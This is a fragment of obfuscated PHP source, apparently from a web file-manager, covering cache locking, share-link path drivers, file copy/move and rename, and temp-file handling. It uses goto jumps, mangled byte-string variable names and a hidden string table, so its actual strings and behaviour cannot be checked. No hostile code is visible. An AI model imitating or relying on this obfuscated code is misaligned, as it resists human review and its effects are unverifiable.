strlen($Fòô½Ï½™ö[0]); $fµĞª£®¸ = intval($Fòô½Ï½™ö[1]) . $fÈå¾Æå–ğ[70] . intval($Fòô½Ï½™ö[2]); } elseif (1 == preg_match($fÈå¾Æå–ğ[1583], substr($FìÈõõ°†, $CÔ¤›‹Ò­, 33), $Fòô½Ï½™ö)) { $Cí«ªáçŞÀ = $fÈå¾Æå–ğ[1584]; $fµĞª£®¸ = intval($Fòô½Ï½™ö[1]) . $fÈå¾Æå–ğ[70] . intval($Fòô½Ï½™ö[2]); $CÔ¤›‹Ò­ += strlen($Fòô½Ï½™ö[0]); } elseif (($Bó¦‰İ‚¤‰ = strspn($FìÈõõ°†, $fÈå¾Æå–ğ[1585], $CÔ¤›‹Ò­)) > 0) { $Cí«ªáçŞÀ = $fÈå¾Æå–ğ[1586]; $fµĞª£®¸ = substr($FìÈõõ°†, $CÔ¤›‹Ò­, $Bó¦‰İ‚¤‰); $CÔ¤›‹Ò­ += $Bó¦‰İ‚¤‰; } break; } goto eˆ„¼ µ¼; E‚“™È±¬: $fÈå¾Æå–ğ =& $_SERVER[Ö¹ñÒÁ²÷]; $Cí«ªáçŞÀ = $fÈå¾Æå–ğ[33]; $fµĞª£®¸ = $fÈå¾Æå–ğ[33]; goto f¥Üæí³Ø®; eˆ„¼ µ¼: return array($Cí«ªáçŞÀ, $fµĞª£®¸, $CÔ¤›‹Ò­); goto e÷¿ôáÌØÛ; e÷¿ôáÌØÛ: } } goto Bˆ‚íìÉ®Š; a‚«ºÛ°–Ï: function cacheLockWait() { usleep(mt_rand(5, 50) * 100); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $eŞ“ôÁ•òÎ =& $_SERVER[Ö¹ñÒÁ²÷]; $eä‚Ø˜Ó’¶ = $GLOBALS[$eŞ“ôÁ•òÎ[6]][$eŞ“ôÁ•òÎ[333]]; self::$cachePath = $eä‚Ø˜Ó’¶[$eŞ“ôÁ•òÎ[163]][$eŞ“ôÁ•òÎ[75]]; @mkdir(self::$cachePath, 511, !0); } public function lock($e…ÇõŒÇ•¬, $D‰ëÈÑĞÀ = 0) { goto eáŸŠëóº‰; BÈùİå¯å¹: $AÆ½Ÿ˜Ì§¼ = rtrim(self::$cachePath, $Cµ¶›ÃÌ‡[8]) . $Cµ¶›ÃÌ‡[769] . md5($e…ÇõŒÇ•¬) . $Cµ¶›ÃÌ‡[770]; if (file_exists($AÆ½Ÿ˜Ì§¼) && filemtime($AÆ½Ÿ˜Ì§¼) && filemtime($AÆ½Ÿ˜Ì§¼) < time() - 10) { @unlink($AÆ½Ÿ˜Ì§¼); } do { if (file_exists($AÆ½Ÿ˜Ì§¼)) { cacheLockWait(); continue; } $FùäÒ™åÌò = fopen($AÆ½Ÿ˜Ì§¼, $Cµ¶›ÃÌ‡[771]); if (!$FùäÒ™åÌò) { return !1; } $A’ˆµæ¤Ô = flock($FùäÒ™åÌò, LOCK_EX | LOCK_NB); self::$caches[$e…ÇõŒÇ•¬] = array($Cµ¶›ÃÌ‡[772] => $FùäÒ™åÌò, $Cµ¶›ÃÌ‡[163] => $AÆ½Ÿ˜Ì§¼); fwrite($FùäÒ™åÌò, $BÁÀ´÷¡‘Ì); clearstatcache(); if ($FùäÒ™åÌò && $A’ˆµæ¤Ô) { return !0; } cacheLockWait(); } while (microtime(!0) < $BÁÀ´÷¡‘Ì); goto dÍ¸×³Ù•; dÍ¸×³Ù•: $this->unlock($e…ÇõŒÇ•¬); return !1; goto DØÚëßÆÖà; eáŸŠëóº‰: $Cµ¶›ÃÌ‡ =& $_SERVER[Ö¹ñÒÁ²÷]; $CŒ§§ª´§î = microtime(!0); $BÁÀ´÷¡‘Ì = $CŒ§§ª´§î + $D‰ëÈÑĞÀ + 0.0001; goto BÈùİå¯å¹; DØÚëßÆÖà: } public function lockGet($Aê–™õ´æå) { $d­ ‹ÊœØ¡ =& $_SERVER[Ö¹ñÒÁ²÷]; $c…šãÆŞİ½ = rtrim(self::$cachePath, $d­ ‹ÊœØ¡[8]) . $d­ ‹ÊœØ¡[769] . md5($Aê–™õ´æå) . $d­ ‹ÊœØ¡[770]; return file_exists($c…šãÆŞİ½); } public function unlock($cµİ®™Ãİˆ) { goto bÖ”µ»í¼Ò; Aõ»î¯ÖÆî: @flock($d®ğíÒ¨šÌ[$b¤ãªà¾å„[772]], LOCK_UN); @fclose($d®ğíÒ¨šÌ[$b¤ãªà¾å„[772]]); @unlink($d®ğíÒ¨šÌ[$b¤ãªà¾å„[163]]); goto fÆ±Ù²¬²; fÆ±Ù²¬²: unset(self::$caches[$cµİ®™Ãİˆ]); goto AºïÔÑÓ‡; bÖ”µ»í¼Ò: $b¤ãªà¾å„ =& $_SERVER[Ö¹ñÒÁ²÷]; $d®ğíÒ¨šÌ = self::$caches[$cµİ®™Ãİˆ]; if (!$d®ğíÒ¨šÌ) { return; } goto Aõ»î¯ÖÆî; AºïÔÑÓ‡: } } class CacheLockRedis { public function lock($DÛÂÀŒ¡„°, $dÛæ“Ë“Š… = 10) { $E£ÒÙØÚï¿ = Cache::init(); $dÖ’Ÿ¸çÁÏ = microtime(!0) + $dÛæ“Ë“Š…; while (microtime(!0) < $dÖ’Ÿ¸çÁÏ) { $a’òŠÂº†» = $E£ÒÙØÚï¿->get($DÛÂÀŒ¡„°); if (!$a’òŠÂº†») { $FœøË²ŞÜ™ = $E£ÒÙØÚï¿->setLock($DÛÂÀŒ¡„°, $dÖ’Ÿ¸çÁÏ, $dÛæ“Ë“Š…); if ($FœøË²ŞÜ™) { return !0; } } else { if ($a’òŠÂº†» < microtime(!0)) { $E£ÒÙØÚï¿->set($DÛÂÀŒ¡„°, $dÖ’Ÿ¸çÁÏ, $dÖ’Ÿ¸çÁÏ); if ($E£ÒÙØÚï¿->get($DÛÂÀŒ¡„°) === $a’òŠÂº†») { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($aÔ¦®Å¼§Ã) { return Cache::init()->get($aÔ¦®Å¼§Ã); } public function unlock($EÀ‰Æ†¹²ó) { return Cache::init()->remove($EÀ‰Æ†¹²ó); } } goto aêÜšîè¾é; A©÷–±‡´®: function beforeShutdownFatalError($F„¿ ìÁÎ‡) { think_exception($F„¿ ìÁÎ‡); } $_SERVER[$_SERVER[¡Äç²][48]] = $f›Ó•ò«Ÿª($_SERVER[$_SERVER[¡Äç²][45]]); $Fƒ·‹Ô¢Ù = E_ALL ^ E_NOTICE ^ E_WARNING ^ E_DEPRECATED; goto C©©ùÀÍ›²; DÂ‘´Áµñ¬: class PathDriverDbShareLink extends PathDriverDB { public function __construct($CŸ»¥´Šâ) { $this->pathParse = $CŸ»¥´Šâ; $this->model = Model($_SERVER[Ö¹ñÒÁ²÷][1104]); } protected function infoParse($CóŠëœŠˆÑ, $cºğÖÄÓƒí = false, $A¦»œà‹ø¡ = false) { $B¯ÆÄñÙ¢ã =& $_SERVER[Ö¹ñÒÁ²÷]; return Action($B¯ÆÄñÙ¢ã[1011])->sharePathInfo($this->pathParse[$B¯ÆÄñÙ¢ã[75]], !0); } public function listPath($FãˆíØìéÓ, $dİÚ¬„Ò‡Ø = false) { $FÊˆ¢ÚÎ– =& $_SERVER[Ö¹ñÒÁ²÷]; $b‚İ³İ»ˆ = parent::listPath($FãˆíØìéÓ, $dİÚ¬„Ò‡Ø); foreach ($b‚İ³İ»ˆ as $eëæÛµ‚´™ => $dª™ÌĞíÉ“) { if (!in_array($eëæÛµ‚´™, array($FÊˆ¢ÚÎ–[73], $FÊˆ¢ÚÎ–[74]))) { continue; } foreach ($dª™ÌĞíÉ“ as $fÀÏğ¢‹ => $f‡Ä•İçÙè) { $b‚İ³İ»ˆ[$eëæÛµ‚´™][$fÀÏğ¢‹] = Action($FÊˆ¢ÚÎ–[1011])->shareItemInfo($f‡Ä•İçÙè); } } return $b‚İ³İ»ˆ; } public function listAll($e¿Ğ„„‹¨’) { $D©Á˜¤«Œã =& $_SERVER[Ö¹ñÒÁ²÷]; $e¿¦ŸºÆ‘‡ = IO::info($this->pathParse[$D©Á˜¤«Œã[75]]); if (!$e¿¦ŸºÆ‘‡) { return array(); } $Bä¼Ëòã = $this->model->listAll($e¿Ğ„„‹¨’); foreach ($Bä¼Ëòã as &$FêÌÑˆÉÅ) { $FêÌÑˆÉÅ[$D©Á˜¤«Œã[387]] = Action($D©Á˜¤«Œã[1011])->shareItemInfo($FêÌÑˆÉÅ[$D©Á˜¤«Œã[387]]); } return $Bä¼Ëòã; } } class PathDriverDriverShareItem { public function __construct($f¹ßéè·ãƒ) { $this->pathParse = $f¹ßéè·ãƒ; } public function __call($F¦°è‚µê„, $A®ì¹Ó…Çò) { $BéÍ“ÁíïŸ =& $_SERVER[Ö¹ñÒÁ²÷]; if (method_exists($this, $F¦°è‚µê„)) { return; } $CŞ•Êãã¡ = call_user_func_array(array($BéÍ“ÁíïŸ[1111], $F¦°è‚µê„), $A®ì¹Ó…Çò); $F‹Ï—­° = array($BéÍ“ÁíïŸ[1112], $BéÍ“ÁíïŸ[1113], $BéÍ“ÁíïŸ[1114], $BéÍ“ÁíïŸ[1115], $BéÍ“ÁíïŸ[486], $BéÍ“ÁíïŸ[488], $BéÍ“ÁíïŸ[1116], $BéÍ“ÁíïŸ[102], $BéÍ“ÁíïŸ[1117], $BéÍ“ÁíïŸ[1118]); if (in_array($F¦°è‚µê„, $F‹Ï—­°)) { $CŞ•Êãã¡ = $this->getPathOuter($CŞ•Êãã¡); } return $CŞ•Êãã¡; } public function copy($EšâºˆˆâÃ, $C¤ÀªÖõİ¦, $Aß½¡©¦®² = false) { return $this->copyMove($EšâºˆˆâÃ, $C¤ÀªÖõİ¦, $Aß½¡©¦®², $_SERVER[Ö¹ñÒÁ²÷][486]); } public function move($eª¡¡êùéÔ, $c„ŠÊù§‹á, $F‹ô°ëÈïø = false) { return $this->copyMove($eª¡¡êùéÔ, $c„ŠÊù§‹á, $F‹ô°ëÈïø, $_SERVER[Ö¹ñÒÁ²÷][488]); } private function copyMove($eŒ²¤ÔŠ¶“, $F“®Ë£Ë•î, $dî×ñ—Ã­É, $DÁ£Şõ‘¤) { goto eÆË¶çæÖ; F¹ôÂ…Œ±: if ($eªÆîÚ³•->pathParse[$eÅá‰º¬[992]]) { $F“®Ë£Ë•î = $eªÆîÚ³•->pathParse[$eÅá‰º¬[992]]; } else { $F“®Ë£Ë•î = $F —¥÷ïœ…; } $aŞä÷—Ùè = IO::copyMove($eŒ²¤ÔŠ¶“, $F“®Ë£Ë•î, $dî×ñ—Ã­É, $DÁ£Şõ‘¤); $aŞä÷—Ùè = $this->getPathOuter($aŞä÷—Ùè); goto Dñ£×Ûà–µ; Dñ£×Ûà–µ: return $aŞä÷—Ùè; goto AÀ„·Ì•É´; eÆË¶çæÖ: $eÅá‰º¬ =& $_SERVER[Ö¹ñÒÁ²÷]; $F —¥÷ïœ… = $F“®Ë£Ë•î; $eªÆîÚ³• = IO::driverMake($F“®Ë£Ë•î); goto F¹ôÂ…Œ±; AÀ„·Ì•É´: } public function pathFather($f§ùä‡•Ìë) { return get_path_father($this->pathParse[$_SERVER[Ö¹ñÒÁ²÷][75]]); } public function iconvSystem($BùÚÕŠ¿ˆ) { return $BùÚÕŠ¿ˆ; } protected function infoParse($d—ÂğõÒ) { $déà„ñ…Ş‚ =& $_SERVER[Ö¹ñÒÁ²÷]; $Ağ‡•„¼‡Ó = $this->pathParse[$déà„ñ…Ş‚[435]][$déà„ñ…Ş‚[1012]] . $this->pathParse[$déà„ñ…Ş‚[1005]]; $AÕ¾¡Õõòç = IO::info($Ağ‡•„¼‡Ó); $CÍ†–ìƒÉ¶ = $this->pathParse[$déà„ñ…Ş‚[435]]; return Action($déà„ñ…Ş‚[1110])->_shareItemeParse($AÕ¾¡Õõòç, $CÍ†–ìƒÉ¶); } public function listAll($DÙÆÓİ‚Ö¥) { $c’°Û­¾÷ =& $_SERVER[Ö¹ñÒÁ²÷]; $B¯‚ç§•¿ = IO::listAll($DÙÆÓİ‚Ö¥); $cÏˆËÂ¶¶Ñ = $this->pathParse[$c’°Û­¾÷[435]]; foreach ($B¯‚ç§•¿ as &$FÖÉ´¨Ş‚´) { check_abort(); $FÖÉ´¨Ş‚´ = array_merge(IO::info($FÖÉ´¨Ş‚´[$c’°Û­¾÷[75]]), $FÖÉ´¨Ş‚´); $FÖÉ´¨Ş‚´[$c’°Û­¾÷[387]] = Action($c’°Û­¾÷[1110])->_shareItemeParse($FÖÉ´¨Ş‚´, $cÏˆËÂ¶¶Ñ); } return $B¯‚ç§•¿; } public function getPathOuter($c‰ÁµâÔİ) { goto FŒ¨ôÌç§; FŒ¨ôÌç§: $c›«šïìä¡ =& $_SERVER[Ö¹ñÒÁ²÷]; $AòÓ‰ËÅËë = KodIO::parse($c‰ÁµâÔİ); if ($AòÓ‰ËÅËë[$c›«šïìä¡[29]] == KodIO::KOD_SHARE_ITEM) { return $AòÓ‰ËÅËë[$c›«šïìä¡[75]]; } goto dÊÎ­Ô·ò; dÊÎ­Ô·ò: $bŞ§›¶Ç = KodIO::clear($c‰ÁµâÔİ); $e¸å†ÌÆ = KodIO::clear($this->pathParse[$c›«šïìä¡[435]][$c›«šïìä¡[1012]]); $EÓ”Ù©„ä = substr($bŞ§›¶Ç, strlen($e¸å†ÌÆ)); goto Dì‰¨ôÈ‡‘; Dì‰¨ôÈ‡‘: if (substr($bŞ§›¶Ç, 0, strlen($e¸å†ÌÆ)) != $e¸å†ÌÆ) { return !1; } return $this->pathParse[$c›«šïìä¡[1006]] . $c›«šïìä¡[8] . ltrim($EÓ”Ù©„ä, $c›«šïìä¡[8]); goto bÉâ™ÛäêÏ; bÉâ™ÛäêÏ: } public function getType() { $c‚“³àØ³Ä =& $_SERVER[Ö¹ñÒÁ²÷]; $BíÕ¶£«Œ = str_replace($c‚“³àØ³Ä[71], $c‚“³àØ³Ä[33], get_class($this)); return strtolower($BíÕ¶£«Œ); } public function isTypeObject($Fàø«åÆÚ) { return IO::isTypeObject($Fàø«åÆÚ); } public function info($dÛæ¥¨‰Éò) { return $this->infoParse($dÛæ¥¨‰Éò); } public function infoAuth($dÚ¾µÓÍ±å) { return $this->infoParse($dÚ¾µÓÍ±å); } public function infoWithChildren($EŞ¢Ê¸¢óƒ) { return $this->infoParse($EŞ¢Ê¸¢óƒ); } public function infoFull($cŸ‹¤¬Ä±·) { return $this->infoParse($cŸ‹¤¬Ä±·); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($D‘Æ‹¿’Š) { $this->pathParse = $D‘Æ‹¿’Š; } protected function infoParse($d‚½Ô¦°™ö) { $CŠ„ ÷¦ºÁ =& $_SERVER[Ö¹ñÒÁ²÷]; return Action($CŠ„ ÷¦ºÁ[1011])->sharePathInfo($this->pathParse[$CŠ„ ÷¦ºÁ[75]], !0); } public function listPath($cšÃ¡ÈˆÂß, $DÊÎãÆ‰ñÇ = false) { $E­ˆŒÉÉù =& $_SERVER[Ö¹ñÒÁ²÷]; $eÜëÍµÚ‹ = IO::listPath($cšÃ¡ÈˆÂß, $DÊÎãÆ‰ñÇ); foreach ($eÜëÍµÚ‹ as $CøÙàÁõä• => $BÁËŸ—î–“) { if (!in_array($CøÙàÁõä•, array($E­ˆŒÉÉù[73], $E­ˆŒÉÉù[74]))) { continue; } foreach ($BÁËŸ—î–“ as $DÔ˜ÊšŒÛ => $F«êª‹…áØ) { $F«êª‹…áØ = Action($E­ˆŒÉÉù[1119])->parsePathChildren($F«êª‹…áØ, array($E­ˆŒÉÉù[383] => $cšÃ¡ÈˆÂß)); $eÜëÍµÚ‹[$CøÙàÁõä•][$DÔ˜ÊšŒÛ] = Action($E­ˆŒÉÉù[1011])->shareItemInfo($F«êª‹…áØ); } } return $eÜëÍµÚ‹; } public function listAll($A®ğ«ùÇ¶) { $bÎÙ¼óåî =& $_SERVER[Ö¹ñÒÁ²÷]; $FÙ½Ëùˆ° = IO::listAll($A®ğ«ùÇ¶); foreach ($FÙ½Ëùˆ° as &$Aá¬‹‹Êˆ±) { $Aá¬‹‹Êˆ± = array_merge(IO::info($Aá¬‹‹Êˆ±[$bÎÙ¼óåî[75]]), $Aá¬‹‹Êˆ±); $Aá¬‹‹Êˆ±[$bÎÙ¼óåî[387]] = Action($bÎÙ¼óåî[1011])->shareItemInfo($Aá¬‹‹Êˆ±); } return $FÙ½Ëùˆ°; } } goto Cœ¥‹ ·É; e¼ªÃÜËŞ±: define($_SERVER[Ö¹ñÒÁ²÷][223], 2); define($_SERVER[Ö¹ñÒÁ²÷][224], 3); define($_SERVER[Ö¹ñÒÁ²÷][225], 1); goto a–ÔèŠ±ª; c§µ˜İÇÛù: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $EâÉ—‘ÃÏ =& $_SERVER[Ö¹ñÒÁ²÷]; $this->objectDriver = array($EâÉ—‘ÃÏ[57], $EâÉ—‘ÃÏ[58], $EâÉ—‘ÃÏ[59], $EâÉ—‘ÃÏ[60], $EâÉ—‘ÃÏ[61], $EâÉ—‘ÃÏ[62], $EâÉ—‘ÃÏ[63], $EâÉ—‘ÃÏ[64]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($C“‰ø¹¶‚×) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($C“‰ø¹¶‚×, $_SERVER[Ö¹ñÒÁ²÷][8]); } return $C“‰ø¹¶‚×; } public function getPathName($FèŒøôˆ“é) { return $FèŒøôˆ“é; } public function iconvApp($C’£öİÈ¸) { return $C’£öİÈ¸; } public function iconvSystem($D¿¥ô„†‡Ç) { return $D¿¥ô„†‡Ç; } public function iconvTo($BŠ£É‘­Ò“, $cë´”İï, $A›Á±£–¬´) { goto c¹ĞÃ­ Ë½; c¹ĞÃ­ Ë½: $aÁ¾ÛÍ“òƒ =& $_SERVER[Ö¹ñÒÁ²÷]; if (!$BŠ£É‘­Ò“ || !function_exists($aÁ¾ÛÍ“òƒ[65])) { return $BŠ£É‘­Ò“; } static $B×©°ø…© = array(); goto DäÉŸ¹âÄ; DŞîŠ§â¬: $B×©°ø…©[$A›Á±£–¬´ . $aÁ¾ÛÍ“òƒ[66] . $cë´”İï . $aÁ¾ÛÍ“òƒ[67] . $BŠ£É‘­Ò“] = $BŠ£É‘­Ò“; $B×©°ø…©[$A›Á±£–¬´ . $aÁ¾ÛÍ“òƒ[66] . $cë´”İï . $aÁ¾ÛÍ“òƒ[67] . $dËùˆÎğèÁ] = $BŠ£É‘­Ò“; $B×©°ø…©[$cë´”İï . $aÁ¾ÛÍ“òƒ[66] . $A›Á±£–¬´ . $aÁ¾ÛÍ“òƒ[67] . $dËùˆÎğèÁ] = $dËùˆÎğèÁ; goto FçæŸ•¹ŒŸ; DäÉŸ¹âÄ: $B¬¸ßä¯Û = $cë´”İï . $aÁ¾ÛÍ“òƒ[66] . $A›Á±£–¬´ . $aÁ¾ÛÍ“òƒ[67] . $BŠ£É‘­Ò“; if (isset($B×©°ø…©[$B¬¸ßä¯Û])) { return $B×©°ø…©[$B¬¸ßä¯Û]; } if (function_exists($aÁ¾ÛÍ“òƒ[68])) { $dËùˆÎğèÁ = @mb_convert_encoding($BŠ£É‘­Ò“, $A›Á±£–¬´, $cë´”İï); } else { $dËùˆÎğèÁ = @iconv($cë´”İï, $A›Á±£–¬´, $BŠ£É‘­Ò“); } goto bœŞæä»Šã; bœŞæä»Šã: $dËùˆÎğèÁ = $dËùˆÎğèÁ ? $dËùˆÎğèÁ : $BŠ£É‘­Ò“; if (strstr($dËùˆÎğèÁ, $aÁ¾ÛÍ“òƒ[69])) { $dËùˆÎğèÁ = str_replace($aÁ¾ÛÍ“òƒ[69], $aÁ¾ÛÍ“òƒ[70], $dËùˆÎğèÁ); } $B×©°ø…©[$cë´”İï . $aÁ¾ÛÍ“òƒ[66] . $A›Á±£–¬´ . $aÁ¾ÛÍ“òƒ[67] . $BŠ£É‘­Ò“] = $dËùˆÎğèÁ; goto DŞîŠ§â¬; FçæŸ•¹ŒŸ: return $dËùˆÎğèÁ; goto fÜßßˆÄŞš; fÜßßˆÄŞš: } public function getPathInner($E‘Òå·øœ) { $AêŞµ«ŠŒ½ = IO::init($E‘Òå·øœ); return $AêŞµ«ŠŒ½->path; } public function getPathOuter($A„¾†ìÜêØ) { $fÅã¢›ó¹‘ =& $_SERVER[Ö¹ñÒÁ²÷]; $aŒØ–“ ‚Í = strlen(trim($this->pathBase, $fÅã¢›ó¹‘[8])); $A„¾†ìÜêØ = substr(trim($A„¾†ìÜêØ, $fÅã¢›ó¹‘[8]), $aŒØ–“ ‚Í); return $this->pathDriver . $fÅã¢›ó¹‘[8] . ltrim($A„¾†ìÜêØ, $fÅã¢›ó¹‘[8]); } public function isParentOf($CèƒÎ›Œø¢, $bøŸø„²Ÿ‰) { $C£šæ´í‹Ù =& $_SERVER[Ö¹ñÒÁ²÷]; $CèƒÎ›Œø¢ = rtrim(strtolower($CèƒÎ›Œø¢), $C£šæ´í‹Ù[8]) . $C£šæ´í‹Ù[8]; $bøŸø„²Ÿ‰ = rtrim(strtolower($bøŸø„²Ÿ‰), $C£šæ´í‹Ù[8]) . $C£šæ´í‹Ù[8]; $e‚ãŒİˆ = strpos($bøŸø„²Ÿ‰, $CèƒÎ›Œø¢) === 0; return $e‚ãŒİˆ; } public function getType() { $cë†×„ó¡– =& $_SERVER[Ö¹ñÒÁ²÷]; $dˆ•—âò–– = str_replace($cë†×„ó¡–[71], $cë†×„ó¡–[33], get_class($this)); return strtolower($dˆ•—âò––); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($e³Å°ğÙ½Œ, $d¸å…¤†­) { $Bò—…¾³³œ =& $_SERVER[Ö¹ñÒÁ²÷]; $eˆÀëİÂÊ = rtrim($e³Å°ğÙ½Œ, $Bò—…¾³³œ[8]) . $Bò—…¾³³œ[8] . $d¸å…¤†­; $fâÚŒÃ„‡ = $this->exist($eˆÀëİÂÊ); return $fâÚŒÃ„‡ ? $eˆÀëİÂÊ : !1; } public function renameObject($dÒÂ¸ÌîÙ, $fİŠ Ûİ) { goto BìºÇƒìÉê; EÓí‚’ §Ø: $dÒÂ¸ÌîÙ = $this->getPathOuter($dÒÂ¸ÌîÙ); $fİŠ Ûİ = $this->pathFather($dÒÂ¸ÌîÙ) . $fİŠ Ûİ; if (IO::isFile($dÒÂ¸ÌîÙ)) { $bÇ´‡Ø§£ = IO::copy($dÒÂ¸ÌîÙ, $this->pathFather($dÒÂ¸ÌîÙ), REPEAT_RENAME_FOLDER, $c©“ŞÑËŒ¶); if ($bÇ´‡Ø§£) { IO::remove($dÒÂ¸ÌîÙ); } } else { $bÇ´‡Ø§£ = IO::mkdir($fİŠ Ûİ); if (!$bÇ´‡Ø§£) { return !1; } $Cå•Ÿö„ì± = IO::listPath($dÒÂ¸ÌîÙ, !0); $f¤©ÊäÈÌ¶ = array_merge($Cå•Ÿö„ì±[$D˜Ç«ç¹–ø[73]], $Cå•Ÿö„ì±[$D˜Ç«ç¹–ø[74]]); foreach ($f¤©ÊäÈÌ¶ as $FŞÉË™‰ªî) { IO::move($FŞÉË™‰ªî[$D˜Ç«ç¹–ø[75]], $fİŠ Ûİ, REPEAT_RENAME_FOLDER); } IO::remove($dÒÂ¸ÌîÙ); } goto b”éìµ°¿; BìºÇƒìÉê: $D˜Ç«ç¹–ø =& $_SERVER[Ö¹ñÒÁ²÷]; $c©“ŞÑËŒ¶ = $fİŠ Ûİ; Hook::trigger($D˜Ç«ç¹–ø[72], $this, $dÒÂ¸ÌîÙ, $this, $this->pathFather($dÒÂ¸ÌîÙ) . $fİŠ Ûİ); goto EÓí‚’ §Ø; b”éìµ°¿: return $bÇ´‡Ø§£ ? $fİŠ Ûİ : !1; goto B‚¹ĞÅïÖ°; B‚¹ĞÅïÖ°: } public function tempFile($Cİ†ìÛ”øœ = '', $A¥§–»ê¬ = '') { goto dÈ›‚¥Î±¨; E«ÄÄŒˆÒš: return $F›—–ƒùã×; goto f£ÓÛÂ¨·; EöÒˆÂù‹: $F›—–ƒùã× = $FÂÓµƒÏÎù . $Cİ†ìÛ”øœ; @touch($F›—–ƒùã×); if ($A¥§–»ê¬) { file_put_contents($F›—–ƒùã×, $A¥§–»ê¬); } goto E«ÄÄŒˆÒš; dÈ›‚¥Î±¨: if (!$Cİ†ìÛ”øœ) { $Cİ†ìÛ”øœ = rand_string(15); } $FÂÓµƒÏÎù = TEMP_FILES . rand_string(15) . $_SERVER[Ö¹ñÒÁ²÷][8]; @mkdir($FÂÓµƒÏÎù, 511, !0); goto EöÒˆÂù‹; f£ÓÛÂ¨·: } public function tempFileRemve($Bî‚††ÚŒÊ) { @unlink($Bî‚††ÚŒÊ); @rmdir($this->pathFather($Bî‚††ÚŒÊ)); } public function mkfile($b©¦™¡¼±, $a¦ïê …Ö = '', $c”˜»õ¼›÷ = REPEAT_RENAME) { } public function mkdir($dˆ¥à¾‰µÍ, $aä‰½–„‚ = REPEAT_SKIP) { } public function copyFile($eÛÖ¯†šÕ…, $fäğ”™ˆ·ë) { } public function moveFile($DÉ¬Ãù‘‹, $e”ù‘ ²·) { } public function remove($AÅ‹‹—ƒ¤) { if ($this->isFile($AÅ‹‹—ƒ¤)) { return $this->delFile($AÅ‹‹—ƒ¤); } return $this->delFolder($AÅ‹‹—ƒ¤); } public function rename($f¢Œƒáé¤¿, $Dõé¡³Ö’) { } public function exist($c£†«Óˆã¬) { } public function findByHash($EìÆ¾ÇªÕª = '', $C‹§±àÎ¶½ = '') { return !1; } public function isFile($bˆŒ×ÍîÖÀ) { } public function isFolder($B‹°éù¾î) { } public function size($b£œ‡Æ¬Ìâ) { } public function info($aŠŠ×©êÌ÷) { } public function infoSimple($F«ö–òÅ–Ö) { return $this->info($F«ö–òÅ–Ö); } public function infoAuth($dµÎí©»ù×) { return $this->info($dµÎí©»ù×); } public function infoFull($FØ«É´ŸôÑ) { return $this->info($FØ«É´ŸôÑ); } public function infoWithChildren($Dæ®…èÖç) { $e¤­½™šĞí =& $_SERVER[Ö¹ñÒÁ²÷]; $a„éñâõÆ¿ = $this->info($Dæ®…èÖç); if ($a„éñâõÆ¿ && $a„éñâõÆ¿[$e¤­½™šĞí[29]] == $e¤­½™šĞí[76]) { $D²ŸÆ±ß–Ä = array($e¤­½™šĞí[77] => 0, $e¤­½™šĞí[78] => 0, $e¤­½™šĞí[79] => 0); $this->infoChildren($Dæ®…èÖç, $D²ŸÆ±ß–Ä); $a„éñâõÆ¿[$e¤­½™šĞí[77]] = $D²ŸÆ±ß–Ä[$e¤­½™šĞí[77]]; $a„éñâõÆ¿[$e¤­½™šĞí[80]] = array($e¤­½™šĞí[81] => $D²ŸÆ±ß–Ä[$e¤­½™šĞí[78]], $e¤­½™šĞí[82] => $D²ŸÆ±ß–Ä[$e¤­½™šĞí[79]]); } return $a„éñâõÆ¿; } public function listPath($AŠšƒƒÒÓ, $F¿®æÏƒš³ = false) { } public function has($A¨ô§ÉĞÎ‘, $bÍ¢õÙ§Ëñ = false, $AÊ»‰àŒ«› = false) { } public function canRead($dñĞÊ¸—Ş¶) { } public function canWrite($e‰´Ÿ¸ƒµ±) { } public function getContent($B‰È†óëî³) { } public function setContent($B¸¨‡ŞÕÓÁ, $e §ôÆ¨éÂ = '') { } protected function infoChildren($d·Ãïæè‰, &$fÕ¡Ò¸ñËÖ) { $F¬ã°‹Ÿ¦’ =& $_SERVER[Ö¹ñÒÁ²÷]; check_abort(); $dÜÚ•†¡áø = $this->listPath($d·Ãïæè‰, !0); $dÜÚ•†¡áø = array_merge($dÜÚ•†¡áø[$F¬ã°‹Ÿ¦’[74]], $dÜÚ•†¡áø[$F¬ã°‹Ÿ¦’[73]]); foreach ($dÜÚ•†¡áø as $F‹½óÚô†¸) { if ($F‹½óÚô†¸[$F¬ã°‹Ÿ¦’[29]] == $F¬ã°‹Ÿ¦’[76]) { $fÕ¡Ò¸ñËÖ[$F¬ã°‹Ÿ¦’[79]]++; $C»¹Üß‡Ù = $this->getPathInner($F‹½óÚô†¸[$F¬ã°‹Ÿ¦’[75]]); $this->infoChildren($C»¹Üß‡Ù, $fÕ¡Ò¸ñËÖ); } else { $fÕ¡Ò¸ñËÖ[$F¬ã°‹Ÿ¦’[78]]++; $fÕ¡Ò¸ñËÖ[$F¬ã°‹Ÿ¦’[77]] += $F‹½óÚô†¸[$F¬ã°‹Ÿ¦’[77]]; } } } public function fileSubstr($fÃ÷½Çé¦, $b—•‹ÖÏ³¤, $d¸¯¬Şæå”) { } public function listAll($EÇ¼Û÷‡õÑ) { } public function upload($dôÂƒ••Ú, $aò¦÷™Æø†, $cÜë“ÚÊã¬ = false, $Bè«¶ ÕÅŒ = REPEAT_REPLACE) { } public function uploadFileByID($AŠ÷³Û÷¾À, $dåË´Å¶Ì, $DÊ›‹÷¶ØÚ) { } public function uploadFileByPath($f«ƒ¸Â¥, $e“ŒÅ¢Ì¬², $D°ŞŞ‡¼… = array()) { } public function isUploadServer() { $b¦ğ“‡Î„ =& $_SERVER[Ö¹ñÒÁ²÷]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $b¦ğ“‡Î„[83]) { return !0; } return $GLOBALS[$b¦ğ“‡Î„[6]][$b¦ğ“‡Î„[84]][$b¦ğ“‡Î„[85]]; } public function isFileOutServer() { $A³ô‹İ·¡§ =& $_SERVER[Ö¹ñÒÁ²÷]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $A³ô‹İ·¡§[83]) { return !0; } return $GLOBALS[$A³ô‹İ·¡§[6]][$A³ô‹İ·¡§[84]][$A³ô‹İ·¡§[86]]; } public function isCdnHost() { return $this->isFileOutServer() || 